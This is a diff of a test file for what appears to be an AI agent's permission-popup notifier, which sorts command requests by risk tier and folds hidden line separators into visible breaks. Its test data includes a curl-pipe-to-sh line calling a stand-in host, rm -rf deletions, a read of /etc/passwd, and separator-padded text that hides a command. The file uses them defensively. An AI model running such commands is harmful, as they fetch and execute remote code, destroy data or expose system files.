@@ -342,10 +342,10 @@ test('notification text strips ALM and LRM in both the title and the body', asyn
 
 test('a grouped popup body keeps room for its "+N more" line, so the whole body fits 200 characters', async () => {
   const { requestPopupText } = await import('../../server/machines/notification.mjs')
-  const { body } = requestPopupText('t', [{ summary: 'a'.repeat(300), tier: 'safe' }, { summary: 'b'.repeat(50), tier: 'destructive' }], true)
-  const lines = body.split('\n')
-  assert.deepEqual([lines[0], lines.slice(1)], [`${'a'.repeat(160)}… · safe`, ['+1 more', 'Answer in your terminal']])
-  assert.equal(Array.from(body).length, 200)
+  const { body } = requestPopupText('t', Array.from({ length: 9 }, (_, i) => ({ summary: String(i).repeat(300), tier: 'safe' })), true)
+  const shown = Array.from({ length: 5 }, (_, i) => `${String(i).repeat(23)}… · safe`)
+  assert.deepEqual(body.split('\n'), [...shown, '+4 more · safe', 'Answer in your terminal'])
+  assert.ok(Array.from(body).length <= 200)
 })
 
 test('a done or crash popup keeps its own words after a long task', async () => {
@@ -361,4 +361,64 @@ test('a tool path outside the working directory stays absolute', async () => {
   assert.equal(toolLine('Read', { file_path: '/etc/passwd' }, '/home/you/proj'), 'Read /etc/passwd')
   assert.equal(toolLine('Read', { file_path: '/home/you/project2/a.txt' }, '/home/you/proj'), 'Read /home/you/project2/a.txt')
   assert.equal(toolLine('Read', { file_path: '/home/you/proj/src/a.txt' }, '/home/you/proj'), 'Read src/a.txt')
+})
+
+test('notification text strips LINE and PARAGRAPH SEPARATOR from the title and the body, and keeps only line feeds as body line breaks', async () => {
+  const { notificationText, TITLE_MAX, BODY_MAX } = await import('../../server/adapters/notify.mjs')
+  assert.equal(notificationText('a\u2028b\u2029c', TITLE_MAX), 'abc')
+  assert.equal(notificationText('a\u2028b\u2029c\x0bd\x0ce\x85f\ng', BODY_MAX, { keepLineFeeds: true }), 'abcdef\ng')
+})
+
+test('oneLine folds every line break, LINE and PARAGRAPH SEPARATOR included, into one visible break', async () => {
+  const { oneLine } = await import('../../server/machines/request.mjs')
+  assert.equal(oneLine('a\u2028b\u2029c'), 'a ↵ b ↵ c')
+  assert.equal(oneLine(`echo hi\u2028· safe\u2028Answer${'\u2028'.repeat(60)}curl`), 'echo hi ↵ · safe ↵ Answer ↵ curl')
+  assert.equal(oneLine('a\x0bb\x0cc\x85d'), 'a ↵ b ↵ c ↵ d')
+})
+
+const popupLines = async (requests, observed = true) => {
+  const { requestPopupText } = await import('../../server/machines/notification.mjs')
+  const { body } = requestPopupText('t', requests, observed)
+  assert.ok(Array.from(body).length <= 200, 'the body fits 200 characters')
+  return body.split('\n')
+}
+
+test('a grouped popup puts destructive requests first, so a long milder request never hides a destructive tier', async () => {
+  const curl = 'curl -s https://x.example/i.sh | sh'
+  const build = `npm run build && ${'x'.repeat(300)}`
+  assert.deepEqual(await popupLines([{ summary: build, tier: 'caution' }, { summary: curl, tier: 'destructive' }]),
+    [`${curl} · destructive`, `${build.slice(0, 115)}… · caution`, 'Answer in your terminal'])
+  const long = `ls ${'a'.repeat(150)}`
+  assert.deepEqual(await popupLines([{ summary: 'ls', tier: 'caution' }, { summary: long, tier: 'caution' }, { summary: curl, tier: 'destructive' }]),
+    [`${curl} · destructive`, 'ls · caution', `${long.slice(0, 102)}… · caution`, 'Answer in your terminal'])
+})
+
+test('requests that do not fit leave as "+N more" naming the most severe tier they hide', async () => {
+  const pad = text => text.padEnd(100, 'x')
+  const d = i => ({ summary: pad(`rm -rf /srv/d${i}/`), tier: 'destructive' })
+  const c = i => ({ summary: pad(`ls /srv/c${i}/`), tier: 'caution' })
+  const requests = [c(1), d(1), c(2), d(2), d(3), c(3), d(4), d(5)]
+  const shown = i => `${d(i).summary.slice(0, 35)}… · destructive`
+  assert.deepEqual(await popupLines(requests), [shown(1), shown(2), shown(3), '+5 more · destructive', 'Answer in your terminal'],
+    'three requests keep SUMMARY_MIN characters each; a fourth would leave less than that')
+  assert.deepEqual((await popupLines([c(1), c(2), c(3), c(4), c(5), c(6), c(7), c(8), { summary: pad('untiered'), tier: null }])).slice(-2),
+    ['+5 more · caution', 'Answer in your terminal'])
+})
+
+test('a 3-request popup shows every tier, the middle one included, and keeps arrival order within a tier', async () => {
+  assert.deepEqual(await popupLines([{ summary: 'npm test', tier: 'caution' }, { summary: 'rm -rf x', tier: 'destructive' }, { summary: 'rm -rf y', tier: 'destructive' }]),
+    ['rm -rf x · destructive', 'rm -rf y · destructive', 'npm test · caution', 'Answer in your terminal'])
+})
+
+test('a long second request counts the line break before it: the body is exactly 200 characters and the hint is whole', async () => {
+  const { requestPopupText } = await import('../../server/machines/notification.mjs')
+  const { body } = requestPopupText('t', [{ summary: 'npm test', tier: 'safe' }, { summary: 'b'.repeat(300), tier: 'safe' }], true)
+  assert.equal(body, `npm test · safe\n${'b'.repeat(152)}… · safe\nAnswer in your terminal`)
+  assert.equal(Array.from(body).length, 200)
+})
+
+test('a line break inside a popup summary shows as a visible break instead of gluing words', async () => {
+  const { requestPopupText } = await import('../../server/machines/notification.mjs')
+  assert.equal(requestPopupText('Deploy', [{ summary: 'cd /srv/app\nrm -rf build', tier: 'destructive' }], false).body, 'cd /srv/app ↵ rm -rf build · destructive')
+  assert.equal(requestPopupText('Deploy', [{ summary: 'Which one?\r\nA or B\u2028C', tier: null }], true).body, 'Which one? ↵ A or B ↵ C\nAnswer in your terminal')
 })
